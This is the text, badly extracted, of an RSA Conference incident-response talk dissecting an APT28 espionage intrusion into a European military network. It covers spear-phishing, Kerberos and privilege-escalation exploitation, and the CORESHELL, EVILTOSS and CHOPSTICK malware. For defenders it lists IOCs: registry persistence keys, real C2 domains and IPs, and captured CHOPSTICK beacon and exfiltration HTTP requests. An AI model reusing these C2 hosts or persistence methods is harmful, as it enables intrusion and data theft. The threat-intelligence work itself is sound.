@@ -1,0 +1,1278 @@
+SESSION ID: 
+CTT-W08 
+
+
+Evolving 
+Threats:
+dissection 
+of 
+a 
+Cyber-
+Espionage 
+attack 
+
+
+Stefano Maccaglia 
+
+
+
+Advisory 
+Consultant IR 
+RSA(a Division 
+of EMC) 
+
+
+
+#RSAC 
+
+
+
+#RSAC
+
+Who I Am 
+
+
+• 
+I prefer not to talk too much about myself… 
+• 
+Let just say I am Advisory Consultant at RSA IR 
+• 
+I am an Incident Responder with deep knowledge of malware and network 
+analysts 
+• 
+I have started my career in 1997 
+• 
+I have worked for several top 100 companies 
+PCs. 
+
+
+Before that I have been a cracker in Europe «underground scene» of Amiga and 
+
+#RSAC
+
+Agenda 
+
+
+What we discuss today 
+
+
+• 
+Today I would introduce a case I am still working on. 
+• 
+The case is related to Military Sector, and it has been recorded with minimal 
+differences in several EU military environments. 
+• 
+The details of the attack are under strict NDA, but with slight modifications I have 
+the chance to share the most important details about the attacker strategies, tactics 
+and tools used. 
+• 
+The triage is still going on. 
+The case isinterestingfor severalreasonsthatwewilldiscusstoday.
+
+#RSAC
+
+The adversary 
+
+
+APT28 
+
+
+• 
+The attack has been attributed toAPT Group 28, also known as “Sofacy” or 
+“Sednit”. I will call it “APT28” from now on. 
+• 
+APT28 group believed to have been in operation since 2007 and has been 
+identified in several attacks that have targeted Eastern European governments, 
+military and security-related organizations including the NorthAtlantic Treaty 
+Organization (NATO)
+. 
+The group uses a complex set of tools and strategies to put a foothold in an 
+environment and to control and steal interesting data.
+SeveralsourcesconsiderAPT28 a groupof CyberMercsbased in Russia.
+
+#RSAC
+
+The target: the moat without water 
+
+
+How to develop a good network segmentation and be breached 
+
+
+• 
+The attack 
+has 
+targeted 
+a military 
+environment 
+in EMEAregion. 
+• 
+The environment has born segmented, 
+with several layer of controls to preserve 
+confidentiality and integrity of exchanged and stored data. 
+• 
+The segmentation separates the network in several layers with different level of 
+“trust”
+. 
+• 
+Any operator receives a badge and a smartcard to operate in the network. 
+• 
+Communication from a lower to an higher layer of trust is blocked, instead 
+communication from higher layer to a lower one are permitted. 
+• 
+At the beginning of the investigation I discovered that the base lacks any real 
+network visibility. 
+The only network devices capable of analyzing streams were 
+sporadic IDS and IPS placed in non strategic points. 
+
+#RSAC
+
+The target: the moat without water 
+
+
+How to develop a good network segmentation and be breached 
+
+
+• 
+The environment is a Microsoft AD Forest with a pyramidal structure. 
+• 
+The root AD trusts several subdomains each with 
+its proper set of AD servers. 
+• 
+The forest is regulated with different level of trust. 
+• 
+The «Secret» and «NATO» networks are physically 
+separated entities were people can access only 
+through dedicated machines. 
+• 
+Under no circumstances a user from standard AD 
+structure can access Secret networks. 
+
+#RSAC
+
+The target: the moat without water 
+
+
+How to develop a good network segmentation and be breached 
+
+
+• 
+Patching policies are 15 days behind Microsoft releases. 
+• 
+All other applications are patched and upgraded based on internal CERT 
+approval. 
+• 
+The reason for the delay is due to the need to verify the consistency and the impact 
+of upgrade/patch against production environment. 
+• 
+During the investigation we have discovered that, in the Data Center, two AD 
+they have been breached. 
+
+
+servers related to trusted subdomains, were not properly patched since November 
+2014 due to the swap from a maintenance contractor to another.
+The lack of the patch MS14-068 is a key to understand how deep and how hard 
+
+The AttackThe Attack
+
+#RSAC
+
+The attack strategy 
+
+
+How they 
+break-in 
+
+
+• 
+The attack started from a targeted spear-phish campaign against the participants of 
+the 2014 Farnborough Air Show. 
+• 
+The attack has targeted 7 officials of Air Force (AM) and 2 official of the Navy (MM) 
+the email domain source was: “militaryexponews[.]com” 
+• 
+The attack exploit a Microsoft Word vulnerability (CVE-2015-2424)
+. 
+• 
+Only in two cases the attack completes successfully for the attacker. 
+• 
+In seven cases, the exploit, despite successfully detonated, was not able to start the 
+infection because the machines lack direct Internet access (proxy blocked 
+connection attempts)
+. 
+• 
+The reconstruction of the first stage has been performed after the creation of a 
+proper set of IOCs starting from the infected systems. 
+
+#RSAC
+
+The Attack 
+
+
+CompletecontrolovertargetsystemCHOPSTICKallowstheattackertoextendthecontrolofthetargetEVILTOSScandownloadCHOPSTICKTROJANfromC&CStreamstoexternalC2orDropzoneDisseminationstrategyLateralmovementsandExfilMalwarebeaconstoC&CandsendsstolendataEVILTOSSExecutionSecondStagebackdoordownload(EVILTOSS)
+FirstC&CHTTPPOSTmessageCoreshellDropperVector+
+FirstDropperSpearphishing
+
+#RSAC
+
+Attack Overview: End of First Wave 
+
+
+The infected hosts, during roaming in external sites, communicates with C2 
+
+
+Victim1Victim2BaseAttacker 
+microsofthelpcenter.info 
+Main C2 
+When roaming they connect to C2. 
+Blocked by proxy 
+Attempts to access C2 
+Attempts to access C2 
+Note: The repeated attempts to communicate externally from infected machines blocked 
+by proxy have been considered «of no interest» for the SOC of the base. No other 
+investigation or action has been taken, at time, against these machines. 
+
+
+
+#RSAC
+
+The attack strategy 
+
+
+More patients to care about… 
+
+
+• 
+To escalate the infection the attacker have used the OWAaccess of the stolen 
+accounts to enumerate other potential victims for a new wave of targeted emails. 
+• 
+Also, one of the officers has access to internal Sharepoint 
+service and participates 
+to boards were specific internal meetings and projects are discussed. 
+• 
+With tailored messages published in Sharepoint 
+board, the attacker has been able 
+to sneak through the inner layers of the military infrastructure distributing the 
+dropper.
+One lesson I learn from Sharepoint… 
+it has a horrible Log format. 
+
+#RSAC
+
+Attack Overview: End of Second Wave 
+
+
+Still under control 
+
+SkopjeMoskowKievAddisAbabaVictim1WashingtonBaseAttacker 
+PublicWANStill under control 
+C2s 
+microsofthelpcenter.info 
+1oo7.net 
+176.31.112.10 
+Victim2Basehosts
+
+#RSAC
+
+The attack strategy 
+
+
+The infection evolution 
+
+
+• 
+In this second wave of attack the adversary, knowing that the previous phase has 
+not succeeded as planned due to access restriction with proxy and firewalls, has 
+modified the dropper in order to work with internal proxy (with HTTP and SSL)
+• 
+The modification has insured the control of all successfully infected hosts. 
+TestperformedaftercollectionofthedropperfromoriginalspearphisingemailIOCProxy
+
+#RSAC
+
+The attack strategy 
+
+
+The infection progression 
+
+
+• 
+The attacker has now a significant set of standard Domain Users account. 
+• 
+Not enough to pawn the infrastructure, but good enough as a starting point. 
+• 
+Thanks to his backdoor, he can easily begin to extend his action to other systems. 
+• 
+Lacking logs and network visibility, 
+for that part, we can only speculate that he 
+successfully identifies the vulnerable Navy subdomains by accessing Navy computers 
+in the base. 
+“interesting data” resides. 
+
+
+The victims have direct access to the abovementioned AD servers because they use 
+them for standard authentication.
+APT28 at this point has breached AD servers, has collected domain admins 
+credentials and has moved forward to the Root AD and the repositories where 
+
+#RSAC
+
+CVE 2014-6324 
+
+
+LOG IOC 
+
+
+• 
+Windows Audit log showing the successful exploitation of the Kerberos Service. 
+• 
+When looking at the Audit log, to 
+understand the successful exploit we 
+should compare the Security ID 
+with 
+theAccount Name. 
+These two should be identical. 
+
+
+• 
+In this case, slightly modified from the 
+original log, we can see the «Officer 
+A» logging with the Security ID of 
+«Administrator»
+. 
+
+#RSAC
+
+Pwning 
+the core: CVE-2015-1701 
+
+
+AKA… «How to pwn 
+yourAD and live undetected»
+… 
+
+
+• 
+The attacker has been able to exploit root AD Servers thanks to a unknown (initially) 
+local privilege escalation vulnerability CVE-2015-1701. 
+The attacker has 
+exploited a callback in 
+UserSpace. 
+
+
+Upon completion, the 
+
+Note: The technique has been reported by Microsoft thanks to the 
+analyses carried out in this engagement… 
+
+payload continues 
+execution in UserModewith the privileges of 
+the System process.
+
+The IncidentThe Incident
+
+#RSAC
+
+Patient 
+Zero 
+
+
+How the victim discovers the problem 
+
+
+• 
+The diplomatic representation in Addis Ababa is composed of few militaries and 
+several diplomats connected 
+to Internet with the standard VPN service from public 
+networks (transit 
+through 
+the Base). For that 
+part, nobody has noticed the strange 
+connections to the external C2s repeated each day. 
+• 
+But for a specific task, the owner of the infected laptop has used a connection from 
+a military outpost, tightly regulated in access time and permissions. 
+• 
+Once connected, the computer has attempted to 
+beacon to the C2s and the local 
+network operator has identified the strange traffic signaling it to his superiors.
+The alert has escalated to the Army regiment which has started to investigate.
+The analysis performed has followed the traditional practice.
+
+#RSAC
+
+Patient 
+Zero 
+
+
+What’s 
+on Customer “Patient Zero” machine? 
+
+
+• 
+The forensic 
+analysis on the «Patient 
+Zero» identified 
+by the Customer 
+showed 
+the following 
+suspicious 
+files and registry 
+modifications, but 
+no attempts 
+to 
+expand 
+the focus of the investigation 
+have 
+been 
+made. 
+RegistryKeysandValuesCreatedModifiedHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetworkIdentification Service\parameters\ServiceDll= C:\Windows\System32\netids.dllYesNoHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetworkIdentification Service\parameters\ServiceDllUnloadOnStop= 1YesNoHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Svchost\ntsvcs=NetworkIdentificationServiceYesNoHKEY_LOCAL_MACHINE\software\microsoft\windowsNT\currentversion\svchost\ntsvcs\CoInitializeSecurityParam➝1YesNoEVILTOSSbackdoor
+
+duringa scheduledmaintenanceon a server in the base Data Center.
+Lookingatthe logs, theyhavediscoveredthe presenceof repeatedaccessesfrom 
+ad Administrator account loggingfrom an externalIP address.
+duringa scheduledmaintenanceon a server in the base Data Center.
+Lookingatthe logs, theyhavediscoveredthe presenceof repeatedaccessesfrom 
+ad Administrator account loggingfrom an externalIP address.
+#RSAC
+
+Patient Zero consequences 
+
+
+How the attacker reacted 
+
+
+• 
+The Army has triaged the compromised system reinstalling the OS and applications 
+and has close the case. 
+• 
+As 
+result 
+of the triage, the attacker changes 
+strategy 
+for a while. 
+• 
+APT28 has 
+lowered 
+the volume of his 
+traffic 
+and, for more than 
+20 days 
+nothing 
+has 
+been 
+reported. 
+• 
+The military 
+was 
+ready closed 
+the case, but 
+another 
+anomaly 
+has 
+been 
+founded 
+• 
+The case has 
+escalated 
+quickly 
+this 
+time. 
+
+The MethodologyThe Methodology
+
+#RSAC
+
+What we can bring to the table? 
+
+
+• 
+I am 
+part of RSA IR Team and our 
+structured 
+approach, developed 
+from our 
+field 
+experience 
+is 
+now 
+tuned 
+to face attacks 
+like 
+this 
+one. 
+• 
+Our approach leverages on “Actionable IoCs” and the support of tools that 
+could easily integrate these IoCs to speedup the IR investigation process. 
+• 
+This is a methodology and not a “method”, because it counts on procedures, 
+analyses and evidences in a scientifically sounding approach. 
+• 
+
+
+• 
+
+
+To collect actionable IoCs we use a synergic approach that includes network 
+and system visibility with log and malware analyses.
+It involves aggregation of IoCs and their classification to create a “Knowledge 
+Base” of attacks, tools and strategiesthat could be “reused” in subsequent 
+engagements to streamline the response and support the attribution.
+
+#RSAC
+
+The Methodology 
+
+
+Network 
+visibility 
+
+
+
+Malware 
+
+Incident 
+visibility 
+surface. 
+
+
+
+Network, system 
+
+
+Triage planned 
+from 
+
+System and 
+log indicators. 
+
+
+
+a tailored set of 
+
+visibility 
+Classification 
+and 
+
+
+strategic actions. 
+
+
+attribution. 
+
+
+
+
+#RSAC
+
+Actionable IoCs 
+
+
+What our methodology suggests 
+
+
+• 
+IR is an ongoing process that spawns on multiple areas. 
+
+#RSAC
+
+Actionable IoCs 
+
+
+What our methodology suggests 
+
+
+• 
+To operationalize the IoC you should develop, use and store it in a reusable logic. 
+
+#RSAC
+
+Investigation: first step 
+
+
+• 
+The Customer has initially escalated the problem to another team, but despite 
+the efforts and a triage attempt, the result was not satisfactory. 
+• 
+Few 
+days 
+after 
+the triage they 
+discover 
+additional 
+lateral 
+movements in theirnetwork. 
+• 
+At this 
+point the Customer 
+called 
+us. 
+• 
+We 
+notice, since 
+the initial 
+talk, that 
+the Customer 
+was 
+lacking 
+any 
+network 
+visibility 
+and the investigation 
+was 
+performed 
+without 
+a structured 
+approach. 
+No network visibility 
+
+No detailed analysis has 
+been performed initially 
+
+
+Limited quantity of The initial investigation has 
+historical logs been limited to MD5 search 
+on Domain machines. 
+
+
+
+#RSAC
+
+Zero Trust 
+
+
+Below 
+zero trust… 
+
+
+• 
+Following our advice to bring a network forensic tool in their environment (RSA 
+Security Analytics) we have been able to ensure that, even after the «apparent» 
+expulsion of theattacker, several machines were still infected.
+Successfulcommunicationrecordedafterexpulsion/triage…
+The «network 
+visibility» hasofferedalsothe chance to 
+proactivelymonitor the 
+occurrenceof 
+othermalicious 
+attacks.
+
+#RSAC
+
+Our 
+investigation 
+
+
+Our approach tailored to the case 
+
+
+• 
+We have rebuilt the investigation process from the scratch aiming to identify malicious 
+behavior from the already collected samples to build optimal Network Forensic IOC and to 
+apply them as a base to highlight further machines infected. 
+Redefined 
+Actionable 
+IOCs at Network, System 
+and Log level for different 
+
+Integrated 
+a 
+Network 
+
+
+platforms and systems. 
+
+
+Forensic Tool: RSA SA 
+
+
+
+Improved 
+the triage 
+
+Refocused the malware 
+
+strategy 
+by 
+moving 
+from 
+
+analysis on all identified 
+
+°seek 
+& destroy° 
+to a 
+
+samples to identify 
+
+
+more strategic 
+approach. 
+
+
+Actionable IOCs. 
+
+
+• 
+Thanks to that we have been able to enumerate remaining infected machines and to unearth 
+the “missing piece”: the Chopstick RAT 
+that the original IR team was not capable of identify. 
+We know, from experience, that APT28 uses Chopstick RAT 
+for most interesting targets. 
+
+AttackerToolsAttackerTools
+
+#RSAC
+
+APT 28 Tools 
+
+
+APT 28 Tools seen 
+in this 
+investigation 
+
+
+• 
+CORESHELL: This downloader is the evolution of the previous downloader of 
+choice from APT28 known as “SOURFACE” (or “Sofacy”). This downloader, once 
+executed, create the conditions to download and execute a second-stage 
+(usually Eviltoss) from a C2. 
+• 
+EVILTOSS: This backdoor is delivered through CORESHELLdownloader to gain 
+system access for reconnaissance, monitoring, credential theft, and shellcodeexecution. 
+• 
+CHOPSTICK: This is a modular implant compiled from a software framework that 
+provides tailored functionality and flexibility. 
+By far Chopstick is the most 
+advanced tool used by APT 28. 
+• 
+MIMIKATZ: Everyone of us knows this tool. In this case, this has been of 
+devastating effects to completely compromise AD Forest. 
+
+#RSAC
+
+APT 28 Tools 
+
+
+CORESHELL 
+behavioral 
+analysis 
+
+
+Coreshell was relatively easy to detonate, apart for some AntiVM checks before executing. 
+The behavioral analysis has permitted to highlight several DNS connections: 
+
+
+The DNS requests aim to different external hosts. 
+The malware use a beacon mechanism 
+based on 
+HTTP 
+POST and a separate thread for 
+instructions 
+still 
+in HTTP. 
+The User-Agent, as 
+explained 
+earlier, 
+can be used 
+as 
+IOC, at 
+least 
+for the oldest 
+variants. 
+
+making the IOC useless. 
+
+Note: Latest version of CORESHELL uses the victim’s browser User-Agent 
+
+#RSAC
+
+APT 28 Tools 
+
+
+The attribution has been 
+performed in two ways: 
+
+• 
+by comparison, between the 
+discovered samples and the 
+public ones. 
+• 
+by analysis, looking for 
+indicators related to the date 
+and time of compilation, the 
+time zone, the language of 
+the malware and its 
+behaviour. 
+The dropped files have been verified 
+as well and compared between 
+different droppers. 
+
+CORESHELLATTRIBUTION BYCOMPARISON
+
+#RSAC
+
+APT 28 Tools 
+
+
+EVILTOSS IOCs 
+
+
+• 
+At system 
+level 
+the malware modifies 
+the Registry 
+in order 
+to ensure 
+persistence. 
+• 
+It is 
+dropped 
+and executed, usually, from one 
+of these 
+folders: 
+EVILTOSS 
+installation 
+folder 
+%system% 
+%temp% 
+%commonprogramfiles%\System\ 
+
+
+Registry 
+Keys 
+and 
+Values 
+Created 
+Modified 
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Network 
+Identification Service\parameters\ServiceDll 
+= %EVILTOSS 
+folder%<EVILTOSSNAME>.dll 
+Yes 
+No 
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Network 
+Identification Service\parameters\ServiceDllUnloadOnStop 
+= 
+1 
+Yes 
+No 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
+NT\CurrentVersion\Svchost\ntsvcs 
+= 
+Network 
+Identification 
+Service 
+Yes 
+No 
+HKEY_LOCAL_MACHINE\software\microsoft\windowsNT\currentversion\svchost\ntsvcs\CoInitializeSecurityParam 
+➝ 
+1 
+Yes 
+No 
+
+
+download files from a remote computer and/or the Internetrun executable fileslog keystrokessend gathered information
+
+#RSAC
+
+APT 28 Tools 
+
+
+EVILTOSS ATTRIBUTION BY 
+COMPARISON 
+
+
+The attribution has been 
+performed in two ways: 
+
+• 
+by comparison, between the 
+discovered samples and the 
+public ones. 
+• 
+by analysis, looking for 
+indicators related to the date 
+and time of compilation, the 
+time zone and the language 
+of the malware discovered. 
+Also lateral movements have been 
+verified in terms of timeframe of the 
+log and hosts involved. 
+
+
+
+#RSAC
+
+APT 28 Tools 
+
+
+EVILTOSS IOCs 
+
+
+• 
+EVILTOSS and CORESHELLshare a lot of commonalities, both in the 
+communication mechanism and the obfuscation/encryption. I.E. both obfuscate 
+strings that are decoded at runtime. 
+• 
+EVILTOSS uses 
+RSAencryption 
+to encrypt 
+data and send 
+it 
+through 
+a HTTP 
+POST message 
+very 
+similar 
+to CORESHELLtraffic: 
+Cont…
+C2ackforexfil
+
+#RSAC
+
+APT 28 Tools 
+
+
+CHOPSTICK 
+
+
+• 
+CHOPSTICK is a Trojan family, written in C++ and built from a framework. 
+• 
+It offers a diverse set of capabilities for different deployments. 
+• 
+It collects detailed information from the host settings and it is aware of the presence 
+of several security products. 
+• 
+It may communicate with external servers using SMTP, HTTP or HTTPs. 
+• 
+CHOPSTICK stores all collected information in a hidden file for temporary storage. 
+• 
+It communicates with the C2 via Windows “mailslot”, not named pipes or sockets. 
+• 
+CHOPSTICK main executable creates a “mailslot” in Windows machines and acts as 
+the mailslot 
+server, while its code injected into the other processes acts as a client 
+allowing the Trojan to access and steal any type of information. 
+• 
+The RC4 encryption used here also uses a 50 bytes static key plus four-byte random 
+salt value.
+
+#RSAC
+
+APT 28 Tools 
+
+
+CHOPSTICK IOCs 
+
+
+• 
+Looking at network traffic we discover that, after approximately 60 seconds of 
+execution time, CHOPSTICK begins communicating with one of its C2 servers. 
+Usually as in our sample the traffic was over HTTP: 
+GET /find/?itwm=90QDFR9CWZckwkTPHr2GOUXPXI91A&from=yVVgOqV1UG&utm=HTXh&utm=9kV7L3Z&oprnd=Xjp1kKrDgAeFu&from=06&9u2J=nYruvlhMtXN5HTTP/1.1 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8Accept-Language:en-us,en;q=0.5Accept-Encoding: gzip, deflate 
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;InfoPath.2;.NETCLR 2.0.50727;.NET CLR3.0.04506.648;.NETCLR3.5.21022)
+Host: 198.105.125.74
+• 
+After sending an initial HTTP GET request it uploads the file contents of 
+edg6EF885E2.tmp to the C2 server using HTTP POSTrequests. 
+POST/open/?ags=bBz&ags=qVs5d0kGHtil&oprnd=6ZCuc7XQ&channel=gBDFmj_fJdNk9&itwm=HJxam7mDOyIBftJ6OwEQjGBzyjpQv HTTP/1.1 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8Accept-Language:en-us,en;q=0.5Accept-Encoding: gzip, deflate 
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;InfoPath.2;.NETCLR 2.0.50727;.NET CLR3.0.04506.648;.NETCLR3.5.21022)
+Host: 198.105.125.74 
+Content-Length:69Connection: Keep-Alive 
+Cache-Control: no-cache EMo1MTmWmHwJAwHlezPSG5-SGWRYwQm6MbGxkYhvCv7-FRCezztd2UxRArSxP285WXg==
+
+#RSAC
+
+The attack strategy 
+
+
+IOC: C2 list 
+
+
+• 
+Thanks to our structured approach we have been able to identify the C2s used by 
+the attacker and with them, we have been able to enumerate infected hosts based 
+on network communications. 
+URL 
+IP 
+Type 
+microsofthelpcenter.info 
+87.236.215.13 
+HTTP/HTTPS Main C2 
+driversupdate.info 
+46.19.138.66 
+HTTPS C2 
+1oo7.net 
+5.199.171.58 
+HTTPS C2 
+66.172.12.133 
+66.172.12.133 
+Coreshell C2 
+45.64.105.23 
+45.64.105.23 
+Coreshell C2 
+176.31.112.10 
+176.31.112.10 
+HTTPS C2 
+176.31.96.178 
+176.31.96.178 
+HTTPS C2 
+
+
+Note: The attacker has 
+used different 
+infrastructures for 
+managing infected 
+hosts. 
+
+Note: Some of the 
+discovered C2s are in 
+common with other 
+attacks recorded against 
+other military 
+environments in EMEA. 
+
+
+The C2 list has confirmed the attribution and has paved the way 
+for a more structured approach for Triage 
+
+
+
+
+#RSAC
+
+Incident Timeline and Stats 
+
+
+Results 
+of our 
+methodology 
+Vs previous 
+results 
+obtained 
+by the Customer 
+
+
+Peak 
+of 
+attack 
+distribution 
+
+
+300 
+250 
+
+
+FinaltriagemanagedbyourTeam
+200 
+
+
+First 
+Phase 
+of 
+
+
+Initial
+
+150 
+
+
+Attack
+
+Spearphishing 
+
+
+
+Patient 
+Zero 
+
+
+100 
+
+
+
+Last 
+record 
+of 
+infected 
+
+
+
+machine
+
+50 
+
+
+0 
+
+
+Oct‐14 
+Nov‐14 
+Dec‐14 
+
+
+
+Jan‐15 
+
+
+Feb‐15 
+
+
+Remediation 
+
+
+Mar‐15 
+
+
+Apr‐15 
+
+
+May‐15 
+
+
+APT28
+
+Jun‐15 
+
+
+Jul‐15 
+
+
+Initialmassivetriage
+Aug‐15 
+
+
+SepFirsttimeourmethodologyhasapplied
+‐15 
+
+
+
+APT28 
+Remediation 
+
+
+
+
+#RSAC
+
+Conclusion 
+
+
+What 
+I can suggest 
+
+
+• 
+It is extremely valuable to build an internal Knowledge base about incidents and 
+attacks recorded and published and to extract IOCs from these incidents. 
+• 
+It is 
+extremely 
+useful 
+to refocus 
+the IR procedures 
+dividing 
+them 
+in four 
+areas: 
+• 
+Network Forensic 
+• 
+System Forensic 
+Rapid 
+Incident reaction 
+
+
+Actionable 
+IOCs
+
+• 
+Log Analysis 
+Proactive 
+Management 
+
+
+• 
+Malware Analysis 
+• 
+It could 
+be extremely 
+important 
+to streamline 
+the IR procedures 
+by transforming 
+IOCs 
+to actionable 
+IOCs, that 
+means 
+to evaluate 
+and define 
+which 
+IOC can be reused 
+and 
+which 
+one 
+is 
+limited 
+to a specific 
+attack 
+or event. 
+• 
+It is 
+important 
+to drill 
+and to give 
+IR personnel 
+the chance to learn 
+how 
+to build, use, 
+extract, evaluate 
+and properly 
+storeActionable IOCs. 
+
+#RSAC
+
+Conclusion 
+
+
+What 
+our 
+methodology 
+suggests 
+
+
+YoushouldnotapproachIRoperationsinaunstructuredway.
+Youshouldensureproper
+«visibility»toallIRfields.
+YoushouldavoidtomanagetheIncidentthrough«workarounds»and«shortcuts»
+YoushouldavoidtorelyonlyontechnologiesYoushouldkeepyourIRcapabilitiesupdatedOnceformalized,youshoulduseIoCsaskeyelementtoevaluatetheattacksurfaceYoushouldorganizethetriageinastrategicapproach.
+
+#RSAC#RSAC
+
+EMC, 
+RSA, 
+the 
+EMC 
+logo 
+and 
+the 
+RSA 
+logo 
+are 
+trademarks 
+of 
+EMC 
+Corporation 
+in 
+the 
+U.S. 
+and 
+other 
+countries. 
+
+
+
